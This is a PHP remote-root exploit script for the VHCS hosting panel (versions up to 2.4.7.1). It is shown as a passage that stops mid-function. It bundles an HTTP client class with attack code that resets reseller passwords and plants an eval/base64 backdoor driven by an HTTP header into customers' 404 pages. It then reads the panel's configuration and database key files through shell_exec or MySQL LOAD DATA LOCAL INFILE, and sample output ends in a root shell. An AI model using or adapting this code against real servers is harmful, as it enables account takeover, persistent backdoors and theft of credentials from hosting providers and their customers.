#!/usr/bin/php -q
<?php
error_reporting(E_ALL ^ E_NOTICE);
#
#
# darkfig@darky:/# ./vhcs_sploit.php -url http://localhost/vhcs2/
#
#  VHCS <= 2.4.7.1 (vhcs2_daemon) Remote Root Exploit
#  --------------------------------------------------
# 
# About:
#  by DarkFig < gmdarkfig (at) gmail (dot) com >
#  http://acid-root.new.fr/
#  #acidroot@irc.worldnet.net
# 
# Exploit:
#  + Logged in (Administrator)
#  + The administrator has 2 resellers
#  / Changing dareseller's password
#  / Trying to connect as dareseller:thatpwnz
#  + Login successful
#  + The reseller has 2 users
#  + Host domaintest.fr is connected
#  / Trying to write PHP code
#  + PHP code successfully written
#  / We'll have to bypass open_basedir cause safe_mode=On
#  - User  doesn't have SQL rights
#  / Host domaintest.fr isn't a valid user
#  + Host xpliamaclient.com is connected
#  / Trying to write PHP code
#  + PHP code successfully written
#  / We'll have to bypass open_basedir cause safe_mode=On
#  - User  doesn't have SQL rights
#  / Host xpliamaclient.com isn't a valid user
#  / Changing unautresel's password
#  / Trying to connect as unautresel:thatpwnz
#  + Login successful
#  + The reseller has 1 users
#  + Host thegoodone.com is connected
#  / Trying to write PHP code
#  + PHP code successfully written
#  / We'll have to bypass open_basedir cause safe_mode=On
#  / Trying to create a database
#  + Database 92xpl_db39 successfully created
#  + Using database id 12
#  / Trying to add SQL user
#  + User 93xpl_usr2 successfully created
#  + Using SQL user id 17
#  + Host thegoodone.com is a valid user
#  + Logged in (thegoodone.com - Client)
#  / Trying to load files via local_infile
#  + Ok: /etc/vhcs2/vhcs2.conf
#  + Ok: /var/www/vhcs2/gui/include/vhcs2-db-keys.php
#  + Now you can execute commands as root =]
#  + root@thegoodone.com: id
# 
# uid=0(root) gid=0(root)
#

##############################################
# THE VHCS CODE IS AFTER THE PHPSPLOIT CLASS
##############################################


/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.0
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don't have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this->recv ServerResponse
	 * 
	 */
	function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport))
		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
		else
		   $socket = @fsockopen($this->host,$this->port);
		
		if(!$socket)
		   die("Error: Host seems down");
		
		if($this->method=='get')
		   $this->packet = 'GET '.$this->url." HTTP/1.1\r\n";
		   
		elseif($this->method=='post' or $this->method=='formdata')
		   $this->packet = 'POST '.$this->url." HTTP/1.1\r\n";
		   
		else
		   die("Error: Invalid method");
		
		if(!empty($this->proxyuser))
		   $this->packet .= 'Proxy-Authorization: Basic '.base64_encode($this->proxyuser.':'.$this->proxypass)."\r\n";
		
		if(!empty($this->header))
		   $this->packet .= $this->showheader();
		   
		if(!empty($this->cookie))
		   $this->packet .= 'Cookie: '.$this->showcookie()."\r\n";
	
		$this->packet .= 'Host: '.$this->host."\r\n";
		$this->packet .= "Connection: Close\r\n";
		
		if($this->method=='post')
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method=='formdata')
		{
			$this->packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this->boundary."\r\n";
			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}

		$this->packet .= "\r\n";
		$this->recv = '';

		fputs($socket,$this->packet);

		while(!feof($socket))
		   $this->recv .= fgets($socket);

		fclose($socket);

		if($this->cookiejar)
		   $this->getcookie();

		if($this->allowredirection)
		   return $this->getredirection();
		else
		   return $this->recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this->addcookie('name','value')
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this->cookie))
		   $this->cookie = array();

		$this->cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this->addheader('Client-IP', '128.5.2.3')
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this->header))
		   $this->header = array();
		   
		$this->header[$headern] = $headervalue;
	}


	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this->proxy('localhost',8118)
	 * @example $this->proxy('localhost:8118')
	 * 
	 */
	function proxy($proxy,$proxyp='')
	{
		if(empty($proxyp))
		{
			$proxarr = explode(':',$proxy);
			$this->proxyhost = $proxarr[0];
			$this->proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this->proxyhost = $proxy;
			$this->proxyport = (int)$proxyp;
		}

		if($this->proxyport > 65535)
		   die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this->proxyauth('user','pwd')
	 * @example $this->proxyauth('user:pwd');
	 * 
	 */
	function proxyauth($proxyauth,$proxypass='')
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,':');
			$this->proxyuser = substr($proxyauth,0,$posvirg);
			$this->proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this->proxyuser = $proxyauth;
			$this->proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the 'User-Agent' header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this->agent('Firefox')
	 * 
	 */
	function agent($useragent)
	{
		$this->addheader('User-Agent',$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->header_str Headers
	 * @example $this->showheader()
	 * 
	 */
	function showheader()
	{
		$this->header_str = '';
		
		if(!isset($this->header))
		   return;
		   
		foreach($this->header as $name => $value)
		   $this->header_str .= $name.': '.$value."\r\n";
		   
		return $this->header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this->cookie_str Cookies
	 * @example $this->showcookie()
	 * 
	 */
	function showcookie()
	{
		$this->cookie_str = '';
		
		if(!isset($this->cookie))
		   return;
		
		foreach($this->cookie as $name => $value)
		   $this->cookie_str .= $name.'='.$value.'; ';

		return $this->cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this->packet HttpPacket
	 * @example $this->showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this->packet))
		   return;
		else
		   return $this->packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this->sock()
	 * @example $this->get('localhost/index.php?var=x')
	 * @example $this->get('http://localhost:88/tst.php')
	 * 
	 */
	function get($url)
	{
		$this->target($url);
		$this->method = 'get';
		return $this->sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this->sock()
	 * @example $this->post('http://localhost/','helo=x')
	 * 
	 */	
	function post($url,$data)
	{
		$this->target($url);
		$this->method = 'post';
		$this->data = $data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this->sock()
	 * @example $formdata = array(
	 *                      frmdt_url => 'http://localhost/upload.php',
	 *                      frmdt_boundary => '123456', # Optional
	 *                      'var' => 'example',
	 *                      'file' => array(
	 *                                frmdt_type => 'image/gif',  # Optional
	 *                                frmdt_transfert => 'binary' # Optional
	 *                                frmdt_filename => 'hello.php,
	 *                                frmdt_content => '<?php echo 1; ?>'));
	 *          $this->formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method = 'formdata';
		$this->data = '';
		
		if(!isset($array[frmdt_boundary]))
		   $this->boundary = 'phpsploit';
		else
		   $this->boundary = $array[frmdt_boundary];

		foreach($array as $key => $value)
		{
			if(!preg_match('#^frmdt_(boundary|url)#',$key))
			{
				$this->data .= str_repeat('-',29).$this->boundary."\r\n";
				$this->data .= 'Content-Disposition: form-data; name="'.$key.'";';
				
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= ' filename="'.$array[$key][frmdt_filename]."\";\r\n";

					if(isset($array[$key][frmdt_type]))
					   $this->data .= 'Content-Type: '.$array[$key][frmdt_type]."\r\n";

					if(isset($array[$key][frmdt_transfert]))
					   $this->data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert]."\r\n";

					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}

		$this->data .= str_repeat('-',29).$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_content
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->get('http://localhost/'))
	 * 
	 */
	function getcontent($code='')
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_content = '';
		
		for($i=1;$i<count($code);$i++)
		   $this->server_content .= $code[$i];

		return $this->server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this->server_header
	 * @example $this->getcontent()
	 * @example $this->getcontent($this->post('http://localhost/','1=2'))
	 * 
	 */
	function getheader($code='')
	{
		if(empty($code))
		   $code = $this->recv;

		$code = explode("\r\n\r\n",$code);
		$this->server_header = $code[0];
		
		return $this->server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the "Set-Cookie" header
	 * in the "Cookie" header for the
	 * next request. You don't have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode("\r\n",$this->getheader()) as $header)
		{
			if(preg_match('/set-cookie/i',$header))
			{
				$fequal = strpos($header,'=');
				$fvirgu = strpos($header,';');
				
				// 12=strlen('set-cookie: ')
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this->cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don't have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this->target('http://localhost/')
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg('^http://',$urltarg))
		   $urltarg = 'http://'.$urltarg;
		   
		$urlarr     = parse_url($urltarg);
		$this->url  = 'http://'.$urlarr['host'].$urlarr['path'];
		
		if(isset($urlarr['query']))
		   $this->url .= '?'.$urlarr['query'];
		
		$this->port = !empty($urlarr['port']) ? $urlarr['port'] : 80;
		$this->host = $urlarr['host'];
		
		if($this->port != '80')
		   $this->host .= ':'.$this->port;

		if(!isset($urlarr['path']) or empty($urlarr['path']))
		   die("Error: No path precised");

		$this->path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);

		if($this->port > 65535)
		   die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * 'Set-Cookie' headers values
	 * and it will automatically add
	 * them into the 'Cookie' header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->cookiejar(0)
	 * @example $this->cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code=='0')
		   $this->cookiejar=FALSE;

		elseif($code=='1')
		   $this->cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this->allowredirection(0)
	 * @example $this->allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code=='0')
		   $this->allowredirection=FALSE;
		   
		elseif($code=='1')
		   $this->allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don't have to call it.
	 *
	 * @access private
	 * @return string $this->get('http://'.$this->host.$this->path.$this->last_redirection)
	 * @return string $this->get($this->last_redirection)
	 * @return string $this->recv;
	 * 
	 */
	function getredirection()
	{
		if(preg_match('/(location|content-location|uri): (.*)/i',$this->getheader(),$codearr))
		{
			$this->last_redirection = trim($codearr[2]);
			
			if(!ereg('://',$this->last_redirection))
			   return $this->get('http://'.$this->host.$this->path.$this->last_redirection);

			else
			   return $this->get($this->last_redirection);
		}
		else
		   return $this->recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this->reset('header')
	 * @example $this->reset('cookie')
	 * @example $this->reset()
	 * 
	 */
	function reset($func='')
	{
		switch($func)
		{
			case 'header':
			$this->header = array('');
			break;
				
			case 'cookie':
			$this->cookie = array('');
			break;
				
			default:
			$this->cookiejar = '';
			$this->header = array('');
			$this->cookie = array('');
			$this->allowredirection = '';
			break;
		}
	}
}


class vhcs_xpl extends phpsploit
{
	var $sleep_time = 4;

	#  -rw-r--r-- 1 root root
	var $conf_path = '/etc/vhcs2/vhcs2.conf';

	# -r-------- 1 www-data www-data
	var $keys_path = '/var/www/vhcs2/gui/include/vhcs2-db-keys.php';

	var $head_arr = array(
            'admin/index.php'       => 3,
	    'reseller/index.php'    => 2,
	    '../reseller/index.php' => 2,
	    'client/index.php'      => 1,
	    ''	                    => 0);

	var $privileges = array(
	    3 => 'Administrator',
	    2 => 'Reseller',
	    1 => 'Client');

	var $reg_arr = array(
            1 => '#edit_reseller\.php\?edit_id=([0-9]+)" class="link">(.*) </a> </td>#i',
	    2 => '#edit_user.php\?edit_id=([0-9]+)" class="link">(.*)</a></td>#i',
	    3 => '#delete_sql_database\.php\?id=([0-9]+)#i',
	    4 => '#delete_sql_database\.php\?id=([0-9]+)#i',
	    5 => '#sql_execute_query.php\?id=([0-9]+)#i');

	var $flags = array(
	   -1 => '-',
	    0 => '/',
	    1 => '+');

	function main()
	{
		$this->agent('Mozilla Firefox');
		$this->cookiejar(1);

		$this->mhead();

		$this->uri      = $this->getparam('url', TRUE);
		$this->url_arr  = parse_url($this->uri);

		$this->patch = $this->getparam('patch');
		$this->proxh = $this->getparam('proxhost');
		$this->proxa = $this->getparam('proxauth');

		if($this->proxh)
		   $this->proxy($this->proxh);

		if($this->proxa)
		   $this->proxyauth($this->proxa);

		print "\nExploit:";
		$this->type = $this->login();

		if(empty($this->type))
		{
			if(!$this->patch)
			{
				$this->msg('A patch has been applied to this website', -1);
				$this->msg("See RoMaNSoFt's advisory for more details", -1);
				$this->msg('Try with the -patch option', -1, 1);
			}
			else
			   $this->msg('Bad username/password', -1, 1);
		}

		$this->msg("Logged in (".$this->usr.' - '.$this->privileges[$this->type].')', 1);

		$this->allowredirection(1);

		$this->get_vhcs_conf();

		$this->exec_cmd();

		return;
	}


	function getparam($param, $nec=FALSE)
	{
		global $argv;

		foreach($argv as $value => $key)
		{
			if($key === '-'.$param)
			   return $argv[$value+1];
		}

		if($nec)
		   $this->usage();
		
		return FALSE;
	}

	function mhead()
	{
		print "\n VHCS <= 2.4.7.1 (vhcs2_daemon) Remote Root Exploit";
		print "\n --------------------------------------------------\n";
		print "\nAbout:";
		print "\n by DarkFig < gmdarkfig (at) gmail (dot) com >";
		print "\n http://acid-root.new.fr/";
		print "\n #acidroot@irc.worldnet.net";
		print "\n";
	
		return;
	}
	
	function usage()
	{
		print "\nUsage:";
		print "\n vhcsxpl.php -url <url> [options...]\n";
		print "\nOptions:";
		print "\n -patch <user:pwd>     Unofficial patch applied";
		print "\n -proxhost <ip>        If you wanna use a proxy";
		print "\n -proxauth <usr:pwd>   Proxy with authentication\n";
		print "\n";
	
		exit(1);
	}

	function log_as()
	{
		$this->msg("Trying to connect as ".$this->usr.':'.$this->pwd, 0);
		$this->allowredirection(1);

		$this->post($this->uri.'chk_login.php',
		'uname='.$this->usr.'&upass='.$this->pwd.'&Submit=+++Login+++');

		$this->redir_type = $this->get_type_by_redir();

		if($this->redir_type == 0)
		   $this->msg('Login attempt failed', -1);

		else
		   $this->msg('Login successful', 1);

		return $this->redir_type;
	}

	function get_type_by_redir()
	{
		$this->redir_arr = parse_url($this->last_redirection);
			
		$this->allowredirection(0);

		return $this->head_arr[$this->redir_arr['path']];
	}
	
	function login()
	{
		if($this->patch)
		{
			$this->idents = explode(':', $this->patch);
			list($this->usr, $this->pwd) =	$this->idents;

			$this->type = $this->log_as();

			return $this->log_as_user();
		}
		else
		{
			$this->get($this->uri.'admin/manage_users.php');

			$this->type = 3;

			if(ereg('add_user\.php', $this->getcontent()))
			   return $this->log_as_user();

			else
			   return 0;
		}
	}

	function log_as_user()
	{
		if($this->type == 3)
		   $this->logged_as_admin();

		if($this->type == 2)
		   $this->logged_as_reseller();

		if($this->type == 1)
		{
			if(!$this->patch)
			   return 1;

			else
			   return $this->valid_user();
		}

		else
		   return 0;
	}

	function valid_user()
	{
		if($this->write_code())
		{
			# open_basedir + safe_mode
			if($this->is_safe())
			{
				if($this->bypass_with_db())
				   return 1;

				else
				   return 0;
			}
			else
			   return 1;
		}
		return 0;		
	}

	function logged_as_admin()
	{
		$this->msg('Logged in ('.$this->privileges[3].')', 1);

		$this->get($this->uri.'admin/manage_users.php');

		preg_match_all($this->reg_arr[1], $this->getcontent(), $resellers);

		$this->reseller_count = count($resellers[1]);

		$this->msg('The administrator has '.$this->reseller_count.' resellers', 1);

		for($i=0; $i<$this->reseller_count; $i++)
		{	
			$this->usr = $resellers[2][$i];
			$this->pwd = 'thatpwnz';

			if(!$this->patch)
		   	{
				$this->msg('Changing '.$resellers[2][$i]."'s password", 0);

				$this->reseller_dat = '';

				$this->get($this->uri.'admin/edit_reseller.php?edit_id='.$resellers[1][$i]);

				# only checked ip
				preg_match_all('#name="ip_([0-9]+)" value="asgned" checked#i',
				$this->getcontent(), $reseller_ips);

				$this->ip_count = count($reseller_ips[1]);
				$this->ip_dat = '';

				for($j=0; $j<$this->ip_count; $j++)
				{
					$this->ip_dat .= 'ip_'.$reseller_ips[1][$j].'=asgned';

		   	 		if($j != $this->ip_count-1)
		  	    		   $this->ip_dat .= '&';
				}

				# Change reseller's password/mail
				# This is needed if it was run without -path
				# Because we can't click on the 'Change' button.
				#
				# pwd: thatpwnz
				# mail: <reseller_name>@ohyeah.com
				#
				$this->post($this->uri.'admin/edit_reseller.php',
				'username='.$resellers[2][$i].'&pass=thatpwnz&'.
				'pass_rep=thatpwnz&email='.$resellers[2][$i].''.
				'%40ohyeah.com&nreseller_max_domain_cnt=0&nres'.
				'eller_max_subdomain_cnt=0&nreseller_max_alias'.
				'_cnt=0&nreseller_max_mail_cnt=0&nreseller_max'.
				'_ftp_cnt=0&nreseller_max_sql_db_cnt=0&nresell'.
				'er_max_sql_user_cnt=0&nreseller_max_traffic=0'.
				'&nreseller_max_disk=0&'.$this->ip_dat.'&custo'.
				'mer_id=&fname=&lname=&firm=&zip=&city=&countr'.
				'y=&street1=&street2=&phone=&fax=&Submit=++Upd'.
				'ate++&uaction=update_reseller&edit_id='.
				$resellers[1][$i].'&edit_username='.
				$resellers[2][$i]);

				if($this->log_as() != 2)
				   return 0;
			}
			else
			{
				$this->allowredirection(1);

				$this->get($this->uri.'admin/change_user_interface.php?to_id='.$resellers[1][$i]);

				if($this->get_type_by_redir() != 2)
				   return 0;
			}

			if($this->logged_as_reseller())
			   return 1;

			$this->reset('cookie');
			$this->get($this->uri.'reseller/change_user_interface.php?action=go_back');
		}

		return 0;
	}

	function logged_as_reseller()
	{
		$this->get($this->uri.'reseller/users.php');

		preg_match_all($this->reg_arr[2], $this->getcontent(), $users);
		
		array_walk($users[2], 'trim');
		
		$this->user_count = count($users[1]);
		
		$this->msg('The reseller has '.$this->user_count. ' users', 1);

		$this->patch = FALSE;

		for($i=0; $i<$this->user_count; $i++)
		{
			if($this->is_alive($users[2][$i]))
			{
				$this->usr = $users[2][$i];

				$this->type = 1;

				$this->msg('Host '.$this->usr.' is connected', 1);

				$this->get($this->uri.'reseller/change_user_interface.php?to_id='.$users[1][$i]);

				if($this->valid_user())
				{
					$this->msg('Host '.$this->usr.' is a valid user', 1);
					return TRUE;
				}
				else
				   $this->msg("Host ".$this->usr." isn't a valid user", 0);
			}
			else
			   $this->msg('Host '.$users[2][$i].' seems down', -1);

			$this->get($this->uri.'client/change_user_interface.php?action=go_back');
		}

		return FALSE;
	}

	function bypass_with_db()
	{
		$this->get($this->dmn_vhcs_url.'client/index.php');

		if(!ereg('manage_sql.php', $this->getcontent()) and !$edit)
		{
			$this->msg("User ".$this->ur." doesn't have SQL rights", -1);

			return FALSE;
		}
		
		# No database
		if(!$this->got_db())
		{
			$this->msg('Trying to create a database', 0);

			$this->tmp_db_name = rand(0,100).'xpl_db'.rand(0,100);

			# Database: ..xpl_db..
			$this->post($this->dmn_vhcs_url.'client/add_sql_database.php',
			'db_name='.$this->tmp_db_name.'&id_pos=start&Submit=++Add++&'.
			'uaction=add_db');

			if($this->got_db())
			   $this->msg('Database '.$this->tmp_db_name.' successfully created', 1);

			else
			{
				$this->msg("Can't create the database ".$this->tmp_db_name, 0);

				return FALSE;
			}
		}

		# First database
		$this->db_id = $this->sql_db_ids[1];

		$this->msg('Using database id '.$this->db_id, 1);

		if(!$this->got_db_user())
		{
			$this->msg('Trying to add SQL user', 0);

			$this->tmp_db_user = rand(0,100).'xpl_usr'.rand(0,100);
			
			# SQL user: ..xpl_usr..:xpl_pwd
			$this->post($this->dmn_vhcs_url.'client/sql_add_user.php',
			'user_name='.$this->tmp_db_user.'&id_pos=end&pass=xpl_pw'.
			'd&pass_rep=xpl_pwd&Add_New=++Add++&uaction=add_user&id='.
			$this->db_id);

			if($this->got_db_user())
			   $this->msg('User '.$this->tmp_db_user.' successfully created', 1);

			else
			{
				$this->msg("Can't create the SQL user ".$this->tmp_db_user, 0);

				return FALSE;
			}
		}

		# First SQL user id associed with the database
		$this->db_user_id = $this->sql_usrs[1];

		$this->msg('Using SQL user id '.$this->db_user_id, 1);

		return TRUE;
	}

	function got_db_user()
	{		
		$this->get($this->dmn_vhcs_url.'client/manage_sql.php');

		$this->content_arr = explode("\n", $this->getcontent());

		$this->is_sql_db_usr = FALSE;

		for($i=0; $i<count($this->content_arr); $i++)
		{
			if(preg_match($this->reg_arr[4],
			$this->content_arr[$i], $this->sql_db_id))
			{
				if($this->sql_db_id[1] == $this->db_id)
				   $this->is_sql_db_usr = TRUE;

				else
				   $this->is_sql_db_usr = FALSE;
			}

			if(preg_match($this->reg_arr[5],
			$this->content_arr[$i], $this->sql_usrs))
			{
				if($this->is_sql_db_usr)
				   return TRUE;
			}
		}
		return FALSE;
	}

	function got_db()
	{	
		$this->get($this->dmn_vhcs_url.'client/manage_sql.php');

		preg_match($this->reg_arr[3],
		$this->getcontent(), $this->sql_db_ids);

		if(empty($this->sql_db_ids))
		   return FALSE;

		else
		   return TRUE;
	}

	function is_alive($domain_name)
	{
		if(gethostbyname($domain_name) != $domain_name)
		   return TRUE;

		else
		   return FALSE;
	}

	function write_code()
	{
		$this->msg('Trying to write PHP code', 0);

		$this->dmn_url      = 'http://'.$this->usr;
		$this->dmn_vhcs_url = $this->dmn_url.$this->url_arr['path'];

		$this->get($this->dmn_url.'/errors/404/index.php');
		$this->old_404 = $this->getcontent();

		$this->phpc =
		 '<?php '
		.'error_reporting(0); '
		.'if(isset($_SERVER[\'HTTP_SHELL\'])) '
		.'{ eval(base64_decode($_SERVER[\'HTTP_SHELL\'])); exit(0); } '
		.'?>';

		$this->new_404 = $this->phpc.$this->old_404;

		$this->post($this->dmn_vhcs_url.'client/error_pages.php',
		'error='.urlencode($this->new_404).'&uaction=updt_error&eid=404&Submit=+Save+');

		$this->exec_php('print "itworkz";');

		if(ereg('itworkz', $this->getcontent()))
		{
			$this->msg('PHP code successfully written', 1);

			return TRUE;
		}
		else
		{
			$this->msg("Can't write PHP code", -1);

		   	return FALSE;
		}
	}

	function get_vhcs_conf()
	{
		if($this->safe_mode)
		   $this->msg('Trying to load files via local_infile', 0);

		else
		   $this->msg('Trying to load files via shell_exec', 0);

		$this->lf_conf   = $this->path_content($this->conf_path);
		$this->lf_conf   = trim($this->lf_conf, "\r");

		$this->vhcs_conf = explode("\n", $this->lf_conf);

		$this->conf = array();

		foreach($this->vhcs_conf as $this->conf_line)
		{
			# comment
			if(!ereg('^(\s*)#', $this->conf_line))
			{
				$this->pos   = strpos($this->conf_line, '=');
				$this->name  = strtoupper(trim(substr($this->conf_line, 0, $this->pos)));
				$this->value = trim(substr($this->conf_line, $this->pos+1));

				$this->conf[$this->name] = $this->value;
			}
		}

		$this->php_keys_code = $this->path_content($this->keys_path);

		return;
	}

	function path_content($path)
	{
		# open_basedir On/off
		# safe_mode = Off
		if(!$this->safe_mode)
		{
			$this->phpc = 'print shell_exec("cat '.$path.'");';

			$this->exec_php($this->phpc);

			$this->file_content = $this->getcontent();

		}

		# open_basedir On/Off
		# safe_mode = On
		else
		{
			$this->rand_table = rand().'tmp_hax'.rand();

			$this->sql_query =
			"CREATE TABLE ".$this->rand_table." (content text not null); ".
			"LOAD DATA LOCAL INFILE '$path' INTO TABLE ".$this->rand_table.
			" FIELDS TERMINATED BY '__EOF__' ESCAPED BY '' LINES TERMINAT".
			"ED BY '__EOF__'; SELECT CONCAT(CHAR(80,87,78,69,68,67,79,78,".
			"84,69,78,84),HEX(content),CHAR(80,87,78,69,68,67,79,78,84,69".
			",78,84)) FROM ".$this->rand_table."; DROP TABLE ".
			$this->rand_table;

			$this->sql_arr = explode(';', $this->sql_query);
			$this->sql_cnt = count($this->sql_arr);

			for($i=0; $i<$this->sql_cnt; $i++)
			{
				$this->sql_res = $this->exec_sql($this->sql_arr[$i]);

				if($i == $this->sql_cnt-2)
				   $this->file_content = $this->sql_res;
			}
			
		}

		if(!$this->file_content)
		{
			$this->msg("A problem occurred while trying to read the file $path", -1);
			
			if($this->safe_mode)
			   $this->msg("local_infile=Off or we don't have sufficient access rights to the file", -1, 2);

			else
			   $this->msg("We don't have sufficient access rights to the file", -1, -2);
		}
		else
		   $this->msg("Ok: $path", 1);

		return $this->file_content;
	}

	function exec_sql($query)
	{
		$this->post($this->dmn_vhcs_url.'client/sql_execute_query.php',
		'user_name=&sql_query='.$query.'&Submit=+Execute+&uaction=exe'.
		'cute_query&id='.$this->db_user_id);

		$this->sql_result = '';

		if(ereg('PWNEDCONTENT', $this->getcontent()))
		{
			$this->sql_res_arr = explode('PWNEDCONTENT', $this->getcontent());

			$this->sql_result  = pack('H*', $this->sql_res_arr[1]);
		}
	
		return $this->sql_result;
	}

	function is_safe()
	{
		$this->phpc =
		'if(in_array(strtoupper(ini_get("safe_mode")),array("ON","1")) '
	       .'or !function_exists("shell_exec")) '
	       .'{ print "safe_mode=on"; }';

		$this->exec_php($this->phpc);

		# open_basedir always set
		if(ereg('safe_mode=on', $this->getcontent()))
		{
			$this->msg("We'll have to bypass open_basedir cause safe_mode=On", 0);

			$this->safe_mode = TRUE;
		}
		else
